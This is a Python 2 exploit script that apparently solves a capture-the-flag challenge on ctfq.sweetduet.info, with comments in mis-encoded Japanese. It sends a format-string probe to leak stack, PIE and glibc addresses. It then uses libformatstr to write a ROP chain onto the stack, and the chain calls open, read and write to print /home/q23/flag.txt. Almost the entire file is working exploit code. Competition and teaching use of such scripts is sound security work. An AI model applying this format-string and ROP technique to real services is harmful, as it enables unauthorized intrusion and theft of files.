#!/usr/bin/python
# -*- coding: utf-8 -*-
import struct
import time
import libformatstr
import myutil

# Useful Function -------------------------------------------------------
def get_addr(m):
    # ƒŠƒ^[ƒ“ƒAƒhƒŒƒX‚ÌŽæ“¾
    print "[+] *** get address ***"
    ptr_ret = int(m[77],16) + 0x4
    print "   [+] main ret = %s" % str(hex(ptr_ret))

    # ƒAƒhƒŒƒX‚É0a‚ðŠÜ‚Þê‡CƒŠƒ^[ƒ“(=0x0a)‚ÆŠ¨ˆá‚¢‚³‚ê‚Ä“Ç‚Ýž‚Ý‚ªI—¹‚·‚é‚½‚ßC•K‚¸Ž¸”s‚·‚éD‚»‚±‚ÅCŽŽ‚µ‚Ä‚à–³‘Ê‚¾‚Æ•ª‚©‚Á‚½ê‡‚ÍI—¹‚·‚é
    size = 76 # size = len(shellcode)-4
    ptr_ret_last2byte = int(("%x" % ptr_ret)[-2:], 16)
    if ( (ptr_ret_last2byte < 0x0a) or ((256-(size-0x0a))%256 < ptr_ret_last2byte) ): # ‘‚«ž‚Ýæ‚ÌƒXƒ^ƒbƒNƒAƒhƒŒƒX‚ª0x******0a‚ðŠÜ‚Þê‡‚ÍI—¹‚·‚é
        print "[-] exploit fail, 'cause of including 0x******0a [%x - %x]" %  (ptr_ret, ptr_ret+size)
        exit()

    # PIE‚ÌŠî€‚Æ‚È‚é·•ª‚ð‹‚ß‚é
    pie_diff = int(m[78],16) - 0x8F1
    print "   [+] pie diff = %s" % str(hex(pie_diff))

    # glibc‚Ì“Ç‚Ýž‚Ü‚ê‚Ä‚¢‚éƒAƒhƒŒƒX‚ð‹‚ß‚é
    ptr_glibc = int(m[1],16) - 0x18E440
    print "   [+] glibc = %s" % str(hex(ptr_glibc))

    # open‚ÌƒAƒhƒŒƒX
    ptr_open = ptr_glibc + 0x000ce620
    print "   [+] open = %s" % str(hex(ptr_open))
    # read‚ÌƒAƒhƒŒƒX
    ptr_read =  ptr_glibc + 0x000ceaa0
    print "   [+] read = %s" % str(hex(ptr_read))
    # write‚ÌƒAƒhƒŒƒX
    ptr_write = ptr_glibc + 0x000ceb20
    print "   [+] write = %s" % str(hex(ptr_write))

    print
    return (ptr_ret, pie_diff, ptr_open, ptr_read, ptr_write)

# Main Loop -------------------------------------------------------------

# make socket
#------------------------------------------------------------------------
f = myutil.sock("ctfq.sweetduet.info", 10001)
#f = myutil.sock("127.0.0.1", 10001)

time.sleep(3) # ƒfƒoƒbƒO—pD•Êƒ^[ƒ~ƒiƒ‹‚ÅŽè“®ƒAƒ^ƒbƒ`‚·‚é—]—T‚ðŽ‚½‚¹‚é

# 1st request
#------------------------------------------------------------------------
print f.recv(2048) # DEBUG
print f.recv(2048) # DEBUG

f.send("%p," * 84 + "\n") # %p‚ð‘—‚ê‚éÅ‘å‚Ü‚Å“Ç‚ÝŽæ‚é
ret = f.recv(2048)
print ret
(p_ret, diff, p_open, p_read, p_write) = get_addr(myutil.psplit(ret)) # “Ç‚ÝŽæ‚Á‚½‚à‚Ì‚ðƒp[ƒX‚µ‚ÄCŠeŠÖ”‚ÌƒAƒhƒŒƒX‚ðŽZo‚·‚é

# exploit
#------------------------------------------------------------------------
shellcode = [
    struct.pack("<I", p_open),       # open()
    struct.pack("<I", 0x996 + diff), # pop->pop->pop->ret
    struct.pack("<I", p_ret + 60),   #   *filename
    struct.pack("<I", 0x0),          #   O_RDONLY
    struct.pack("<I", 0x0),          #   mode
    struct.pack("<I", p_read),       # read()
    struct.pack("<I", 0x996 + diff), # pop->pop->pop->ret
    struct.pack("<I", 0x3),          #   fd(Œˆ‚ß‘Å‚¿)
    struct.pack("<I", p_ret + 60),   #   *buf(*filename‚ðÄ—˜—p)
    struct.pack("<I", 0xff),         #   n_read
    struct.pack("<I", p_write),      # write()
    struct.pack("<I", 0x996 + diff), # pop->pop->pop->ret
    struct.pack("<I", 0x1),          #   fd(STDIN)
    struct.pack("<I", p_ret + 60),   #   *buf
    struct.pack("<I", 0xff),         #   n_write
    "//ho",
    "me/q",
    "23/f",
    "lag.",
    "txt\x00"
]

print "[+] shellcode:"
for code in shellcode:
    myutil.xxd(code)

print "[+] exploit start...",
myutil.countdown(5)

for i in xrange(0, len(shellcode), 7): # ‚‘¬‰»‚Ì‚½‚ßCƒtƒH[ƒ}ƒbƒgƒXƒgƒŠƒ“ƒO‚ðˆê‰ñ‚Å7ŒÂ‘—‚é
    p = libformatstr.FormatStr()
    try: # ƒŠƒXƒg’·‚ð’´‚¦‚Ä‚µ‚Ü‚¢CãŽè‚­Ši”[‚Å‚«‚È‚¯‚ê‚Î‚»‚±‚Ü‚Å‚Å—Ç‚¢
        p[p_ret + i*4+ 0] = shellcode[i+0]
        p[p_ret + i*4+ 4] = shellcode[i+1]
        p[p_ret + i*4+ 8] = shellcode[i+2]
        p[p_ret + i*4+12] = shellcode[i+3]
        p[p_ret + i*4+16] = shellcode[i+4]
        p[p_ret + i*4+20] = shellcode[i+5]
        p[p_ret + i*4+24] = shellcode[i+6]
    except:
        pass
    f.send( p.payload(7, start_len=0) + "\n")

f.send("\n")

# read_loop
#------------------------------------------------------------------------
myutil.read_loop(f)
f.close()